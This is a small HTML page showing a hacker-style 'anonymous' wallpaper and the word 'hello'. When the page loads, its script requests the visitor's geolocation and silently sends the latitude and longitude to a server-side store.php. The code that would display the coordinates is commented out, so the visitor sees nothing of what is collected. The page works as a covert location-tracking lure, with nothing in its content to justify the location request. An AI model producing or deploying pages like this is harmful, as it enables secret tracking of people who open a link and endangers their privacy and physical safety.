<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body onload="getLocation()">
    
    <img src="https://images.wallpapersden.com/image/download/anonymous-4k-rain-design_bW5la2eUmZqaraWkpJRobWllrWdma2U.jpg" height="100%" width="80%">
    <p id="demo">
        hello
    </p>
    <script>
         var x = document.getElementById("demo");
        function getLocation() {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
          } else {
            x.innerHTML = "Geolocation is not supported by this browser.";
          }
        }
        
        function showPosition(position) {
            const xhttp=new XMLHttpRequest();
            xhttp.open("GET", "store.php?lat="+position.coords.latitude+"&long="+position.coords.longitude);
            xhttp.send();
          // x.innerHTML = "Latitude: " + position.coords.latitude +
          // "<br>Longitude: " + position.coords.longitude;
        }
        </script>
</body>
</html>
